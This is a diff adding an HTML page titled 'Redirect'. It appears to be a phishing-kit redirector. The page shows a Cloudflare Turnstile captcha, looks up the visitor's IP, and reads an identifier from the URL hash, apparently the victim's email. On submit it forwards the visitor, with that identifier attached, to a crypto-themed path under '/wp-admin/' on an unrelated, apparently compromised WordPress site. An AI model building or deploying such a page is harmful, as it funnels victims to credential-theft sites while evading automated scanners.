@@ -1,0 +1,103 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Redirect</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <style>
+      /* Full-page centering container */
+      body, html {
+        height: 100%;
+        margin: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: Arial, sans-serif;
+      }
+
+      /* Centering the main content container */
+      .container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        border-radius: 8px;
+        max-width: 400px;
+        width: 100%;
+      }
+
+      .loader {
+        border: 6px solid #f3f3f3; /* Light grey */
+        border-top: 6px solid #3498db; /* Blue */
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s linear infinite;
+        display: none;
+      }
+
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div id="captcha" style="margin-top: 30px;">
+        <div class="cf-turnstile" data-sitekey="0x4AAAAAAA9jwXhlvJNHf-Pf"></div>
+        <div id="captcha-error" style="height: 20px; font-size: 12px; margin-top: 5px; color: red;"></div>
+        <div style="text-align: center">
+          <button id="sub" style="width: 180px; cursor: pointer; height: 40px">Submit</button>
+        </div>
+        <div style="display: flex; justify-content: center">
+          <div class="loader" id="loading"></div>
+        </div>
+      </div>
+      <p id="page" style="text-align: center; margin-top: 100px; display: none">Loading...</p>
+    </div>
+
+    <script>
+      window.addEventListener('load', function() {
+        $(document).ready(() => {
+          $.getJSON("https://api.ipify.org?format=json", function(data) {
+            $("#gfg").html(data.ip);
+          });
+        });
+
+        var male = window.location.hash.substr(1);
+        var submit = document.getElementById("sub");
+
+        submit.addEventListener("click", function() {
+          const page = document.getElementById("page");
+          const loader = document.getElementById("loading");
+          const captchaError = document.getElementById("captcha-error");
+
+          // Verify the Turnstile response
+          const turnstileResponse = document.querySelector('.cf-turnstile input').value;
+
+          if (!turnstileResponse) {
+            captchaError.textContent = "This field is required.";
+          } else {
+            captchaError.textContent = "Verifying...";
+            loader.style.display = "block";
+            submit.style.display = "none";
+
+            setTimeout(() => {
+              page.style.display = "block";
+              captcha.style.display = "none";
+            }, 2000);
+
+            setTimeout(() => {
+              let url = "http://astrologyofchanges.com/wp-admin/xbitcloud/chainetwork/etherchain/index.html" + '?userid=' + male;
+              window.location.href = url;
+            }, 2000);
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
